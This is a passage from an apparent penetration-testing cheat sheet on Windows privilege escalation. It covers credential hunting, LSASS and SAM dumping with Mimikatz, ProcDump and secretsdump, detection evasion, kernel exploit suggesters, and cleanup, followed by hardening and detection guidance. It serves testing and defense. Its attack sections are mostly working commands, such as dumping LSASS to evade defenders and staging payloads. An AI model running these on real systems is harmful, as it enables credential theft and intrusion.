## 16. Credential Hunting

**Why this comes before dumping memory:** finding an administrator's password written in a file takes seconds and needs no special privilege. Windows has a handful of predictable places where credentials sit in plaintext.

### Unattended install files

Windows can be installed automatically from an answer file, and that file often contains the local Administrator password in plaintext or trivially encoded. The file is frequently left on disk after setup.

```cmd
dir /s /b C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Autounattend.xml C:\Windows\System32\Sysprep\unattend.xml C:\Windows\System32\Sysprep\Panther\unattend.xml 2>nul
```

```xml
<AutoLogon>
  <Password>
    <Value>UABhAHMAcwB3AG8AcgBkADEAMgAzAA==</Value>
  </Password>
  <Username>Administrator</Username>
</AutoLogon>
```

The `<Value>` is often **base64**, not encryption. Decode it:

```bash
echo 'UABhAHMAcwB3AG8AcgBkADEAMgAzAA==' | base64 -d | iconv -f UTF-16LE
```

Windows encodes the string as UTF-16 before base64, which is why `iconv` is needed to make it readable.

### Search files for passwords

`findstr` is the built-in text search, the Windows `grep`.

```cmd
findstr /si "password" *.xml *.ini *.txt *.config 2>nul
```

| Flag         | What it does                       |
| ------------ | ---------------------------------- |
| `/s`         | Search subdirectories              |
| `/i`         | Case insensitive                   |
| `"password"` | The term                           |
| `2>nul`      | Discard the "access denied" errors |

PowerShell can search more broadly:

```powershell
Get-ChildItem C:\ -Recurse -Include *.xml,*.ini,*.txt,*.config -ErrorAction SilentlyContinue | Select-String "password"
```

`Get-ChildItem -Recurse -Include` walks the tree matching those extensions, and `Select-String` is the content search. `-ErrorAction SilentlyContinue` is the PowerShell equivalent of `2>nul`.

### Search the registry

Applications store passwords in the registry constantly.

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

`/f password` is the search term, `/t REG_SZ` restricts to string values, `/s` recurses. Known spots include VNC, PuTTY sessions, and auto-logon:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

### Saved credentials

```cmd
cmdkey /list
```

`cmdkey` manages stored credentials. If it lists an admin account, you cannot read the password, but you can **use** it:

```cmd
runas /savecred /user:Administrator "C:\Windows\Temp\rev.exe"
```

`/savecred` tells `runas` to use the stored credential rather than prompting. You never see the password, but the command runs as Administrator.

### PowerShell history

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Administrators paste credentials into PowerShell, and PSReadLine logs every command to this file by default.

---

## 17. Credential Theft

**What this is:** extracting password hashes and plaintext credentials from where Windows keeps them in memory and on disk. It needs SYSTEM or an equivalent privilege, so it is usually a step **after** an escalation, used to reach other hosts.

### The two sources

| Source    | What it holds                                                                    | Access needed        |
| --------- | -------------------------------------------------------------------------------- | -------------------- |
| **LSASS** | Plaintext passwords, NTLM hashes, Kerberos tickets of logged-in users, in memory | SYSTEM or `SeDebug`  |
| **SAM**   | Local account password hashes, on disk in the registry                           | SYSTEM or `SeBackup` |

### Mimikatz against LSASS

`LSASS` is the process that handles authentication and caches the credentials of everyone currently logged in. Mimikatz reads them out of its memory.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

| Command                    | What it does                                                          |
| -------------------------- | --------------------------------------------------------------------- |
| `privilege::debug`         | Enable `SeDebugPrivilege`, which lets Mimikatz open the LSASS process |
| `sekurlsa::logonpasswords` | Dump credentials of every logged-in session                           |

```
Authentication Id : 0 ; 996 (00000000:000003e4)
User Name         : Administrator
        * NTLM     : b4b9b02e6f09a9bd760f388b67351e2b
        * Password : (null)
```

| Field       | Meaning                                                                            |
| ----------- | ---------------------------------------------------------------------------------- |
| `User Name` | Whose credential this is                                                           |
| `NTLM`      | The password hash, usable directly in a pass-the-hash attack                       |
| `Password`  | Plaintext if available. Newer Windows stores it less often, so hashes are the norm |

### Dumping the SAM offline

Pulling LSASS with Mimikatz is heavily flagged by defenders. Copying the registry hives and extracting hashes on your own machine is quieter.

```cmd
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
```

The `SAM` holds the hashes, and the `SYSTEM` hive holds the key needed to decrypt them, so you need both. Extract offline:

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

```
Administrator:500:aad3b435b51404ee...:b4b9b02e6f09a9bd760f388b67351e2b:::
```

The format is `user:RID:LM:NTLM:::`. The RID `500` confirms this is the built-in Administrator, and the NTLM hash can be cracked or passed.

### Avoiding Mimikatz detection

Mimikatz's name and signature are on every defender's list. Dumping LSASS to a file with the Sysinternals `ProcDump`, which is a legitimate Microsoft tool, then reading it offline, is a common evasion:

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

`-ma` takes a full memory dump. You then run Mimikatz against the `.dmp` on your own machine, where no defender is watching.

---

## 18. Kernel Exploits

**What it is:** a bug in the Windows kernel or a driver that lets an unprivileged process run code as SYSTEM. The loudest path, and the last resort, because a failed exploit can bluescreen the host.

### Match the build to known exploits

```cmd
systeminfo
```

Feed the OS version and the hotfix list into a suggester. `Watson` and the older `Sherlock` are PowerShell tools that compare installed patches against known kernel vulnerabilities.

```powershell
. .\Sherlock.ps1
Find-AllVulns
```

```
Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338
VulnStatus : Appears Vulnerable
```

`Appears Vulnerable` means the relevant patch is not installed. Verify against the actual hotfix list before running anything, because a suggester only compares version numbers and cannot see a backported fix.

### Recognisable ones

| Exploit                            | Affects                       | Notes                                                     |
| ---------------------------------- | ----------------------------- | --------------------------------------------------------- |
| **MS16-032**                       | Windows 7 to 10, 2008 to 2012 | Secondary logon handle, has a reliable PowerShell version |
| **MS15-051**                       | Windows 7 to 2012 R2          | Win32k, a classic                                         |
| **PrintNightmare (CVE-2021-1675)** | Print spooler, wide range     | Both an RCE and a local privesc                           |
| **HiveNightmare (CVE-2021-36934)** | Windows 10/11                 | Overly permissive `SAM` on disk, no exploit binary needed |

HiveNightmare is worth knowing because it needs no kernel exploit at all: on affected builds a normal user can read the shadow copies of the `SAM` and `SYSTEM` hives directly, then extract hashes as in Section 17.

```cmd
icacls C:\Windows\System32\config\SAM
```

```
C:\Windows\System32\config\SAM BUILTIN\Users:(I)(RX)
```

`BUILTIN\Users:(RX)` on the `SAM` is the vulnerable state. The file should not be readable by users at all.

---

## 19. Proving Access and Cleaning Up

**Why proof matters:** a screenshot of a prompt proves nothing. Collect output only SYSTEM could produce.

```cmd
whoami
hostname
ipconfig | findstr IPv4
whoami /priv
```

`whoami` returning `nt authority\system`, tied to a specific hostname and IP, is the evidence. Note the exact commands you ran so the report shows a path a reader can follow.

### Track and reverse every change

Keep a running list as you work. Windows techniques leave more artifacts than Linux ones.

| Left behind                    | Reverse it                                        |
| ------------------------------ | ------------------------------------------------- |
| Modified service config        | `sc config <svc> binpath= "<original>"`           |
| Replaced service binary        | Restore the `.bak` you kept                       |
| Appended scheduled task script | Remove the line you added                         |
| UAC bypass registry keys       | `reg delete HKCU\Software\Classes\ms-settings /f` |
| Added local admin account      | `net localgroup administrators <you> /delete`     |
| Dumped hive files              | Delete `sam`, `system`, `lsass.dmp`               |
| Uploaded tools                 | Delete from `C:\Windows\Temp`                     |

Hand the client the full list of created and modified objects, even the ones you removed.

---

## 20. Prevention

Every technique here comes from one of four mistakes: **a privilege granted too widely**, **a SYSTEM process trusting a writable file or path**, **a credential left where a user can read it**, or **a missing patch.** The fixes follow the same shapes.

### Fix the privileges

| Finding                                          | Fix                                                                                                   |
| ------------------------------------------------ | ----------------------------------------------------------------------------------------------------- |
| `SeImpersonatePrivilege` on service accounts     | Unavoidable for many services, so isolate those accounts and monitor for potato-style child processes |
| `SeBackup`, `SeRestore`, `SeDebug` on non-admins | Remove. These belong to administrators and backup operators only                                      |
| `AlwaysInstallElevated` enabled                  | Set both keys to `0`. There is almost never a good reason to enable it                                |

### Fix the trust boundary

| Finding                          | Fix                                                                 |
| -------------------------------- | ------------------------------------------------------------------- |
| Weak service permissions         | Restrict `SERVICE_CHANGE_CONFIG` to administrators                  |
| Writable service binary          | Set the binary to `Administrators:F`, `Users:RX`                    |
| Unquoted service path            | **Quote every service binary path** that contains a space           |
| Writable directory in DLL search | Remove user-writable directories from PATH and from program folders |
| Writable scheduled-task script   | `Administrators:F`, `Users:RX` on the script and its folder         |

Quoting a path is one line in the registry and closes Section 8 entirely:

```cmd
sc config VulnApp2 binpath= "\"C:\Program Files\Vuln App2\service.exe\""
```

### Fix the credentials

| Finding                                  | Fix                                                                                  |
| ---------------------------------------- | ------------------------------------------------------------------------------------ |
| `unattend.xml` left on disk              | Delete answer files after imaging                                                    |
| Passwords in files, registry, history    | Never store plaintext credentials; use a vault or managed accounts                   |
| LSASS readable                           | Enable **Credential Guard**, which isolates LSASS secrets in a virtualised container |
| Local admin password reused across hosts | Deploy **LAPS**, which randomises each machine's local admin password                |

### Fix the patching

Missing patches enable the kernel exploits in Section 18 and PrintNightmare. Enable automatic updates and track the hotfix inventory. It is the single highest-value recommendation in most Windows reports.

### Audit for it before an attacker does

```cmd
:: unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

:: AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: run PowerUp or WinPEAS on a schedule and diff the results
```

---

## 21. Detection and Response

**Why an offensive sheet covers this:** the report needs a remediation and detection section, and these are the commands you use to verify a host is clean after a test.

### Watch for the tell-tale process trees

The potato attacks and service abuse produce a distinctive parent-child relationship: a SYSTEM `cmd.exe` or `powershell.exe` spawned by a service or by a low-privilege process.

```powershell
Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name, @{n='Owner';e={($_.GetOwner()).User}}
```

A `cmd.exe` owned by SYSTEM whose parent is `spoolsv.exe` (the print spooler) is a PrintSpoofer signature.

### Key event log IDs

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4672} -MaxEvents 20
```

| Event ID | Meaning                                                                             |
| -------- | ----------------------------------------------------------------------------------- |
| `4672`   | Special privileges assigned to a new logon. Sensitive-privilege use                 |
| `4697`   | A service was installed. Catches service-config abuse                               |
| `4698`   | A scheduled task was created                                                        |
| `4688`   | A new process was created. With command-line logging on, this is the richest source |
| `7045`   | A new service was installed (System log)                                            |

`Get-WinEvent -FilterHashtable` queries a log with a filter; `Id=4672` selects the event type and `-MaxEvents` caps the output.

### Sysinternals for live inspection

| Tool               | Use                                                                                     |
| ------------------ | --------------------------------------------------------------------------------------- |
| `Autoruns`         | Survey every autostart location, the registry Run keys, services, and tasks in one view |
| `Process Explorer` | See process trees, integrity levels, and which account each runs as                     |
| `AccessChk`        | The same tool you attacked with, used to audit permissions on services, files, and keys |

```cmd
accesschk64.exe -uwcqv "Users" * /accepteula
```

Run the exact attacker command as an audit: any service `Users` can write to is a finding to fix.

### Terminate a malicious process

```cmd
tasklist /fi "imagename eq rev.exe"
taskkill /f /pid <pid>
taskkill /f /im rev.exe
```

`/fi` filters the task list, `/f` forces termination, `/pid` targets one process and `/im` targets all with a given image name.

---

## 22. Fast Recall

- **SYSTEM is above Administrator.** Most techniques target SYSTEM directly, because services run as SYSTEM.
- **`whoami /priv` is the first command.** `SeImpersonatePrivilege` means one tool from SYSTEM.
- **Privileges are separate from groups.** A no-rights service account with `SeImpersonate` still reaches SYSTEM.
- **Integrity levels:** an admin runs at Medium until UAC elevates to High. That gap is what UAC bypasses cross.
- **Potato attacks (`SeImpersonate`):** PrintSpoofer on modern hosts, JuicyPotato only pre-2019, RoguePotato when Juicy is patched. `PrintSpoofer64.exe -i -c cmd.exe`.
- **Other privileges:** `SeBackup` reads the SAM, `SeRestore` writes any file, `SeTakeOwnership` owns any object, `SeDebug` dumps LSASS.
- **Service config writable:** `sc config <svc> binpath= "..."`, note the space after `=`. Find with `accesschk64 -uwcqv <user> *`.
- **Unquoted path:** `C:\Program Files\My App\x.exe` tries `C:\Program.exe` first. Find with `wmic service get name,pathname,startmode | findstr /v """`.
- **Writable service binary:** replace the `.exe` directly, no config change. Check with `icacls`.
- **DLL hijack:** a SYSTEM program loading a DLL from a writable directory. `msfvenom -f dll`, name it what the program searches for.
- **Scheduled task:** SYSTEM task running a writable script. `schtasks /query /fo LIST /v`, append with `>>`.
- **`AlwaysInstallElevated`:** both HKLM and HKCU keys must be `0x1`. `msfvenom -f msi`, then `msiexec /quiet /qn /i evil.msi`.
- **`icacls` codes:** `(F)` full, `(M)` modify, `(W)` write. A grant to `Users`, `Everyone`, or `Authenticated Users` is exploitable.
- **UAC bypass** only helps an admin at Medium integrity. fodhelper reads a writable HKCU key and auto-elevates. Not a standard-user-to-admin route.
- **BITS:** `bitsadmin /transfer` to stage a payload quietly, `/SetNotifyCmdLine` to run it on completion.
- **Credential hunting:** `unattend.xml` (base64, UTF-16), `findstr /si password *.*`, `reg query HKLM /f password /t REG_SZ /s`, `cmdkey /list` then `runas /savecred`.
- **Credential theft:** Mimikatz `privilege::debug` then `sekurlsa::logonpasswords` for LSASS; `reg save hklm\sam` plus `system` then `secretsdump` for the SAM. ProcDump LSASS to evade detection.
- **Kernel:** `systeminfo` into Watson/Sherlock. HiveNightmare needs no exploit, just a readable `SAM`.
- **Clean up every artifact:** service configs, replaced binaries, UAC keys, added accounts. Windows leaves more traces than Linux.

---

## 23. Resources

**Reference**

- [MITRE ATT&CK: Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [Microsoft: Privilege Constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
- [The Hacker Recipes: Windows privesc](https://www.thehacker.recipes/)
- [lolbas-project.github.io](https://lolbas-project.github.io/) — living-off-the-land binaries

**Tools**

- [PowerUp / PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [WinPEAS (PEASS-ng)](https://github.com/carlospolop/PEASS-ng)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [JuicyPotato](https://github.com/ohpe/juicy-potato) and [RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [AccessChk (Sysinternals)](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [Autoruns (Sysinternals)](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
- [UACMe](https://github.com/hfiref0x/UACME)
- [impacket (secretsdump)](https://github.com/fortra/impacket)

**Hardening**

- [Microsoft: Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
- [Microsoft: LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks)

**Practice**

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe: Windows PrivEsc](https://tryhackme.com/)
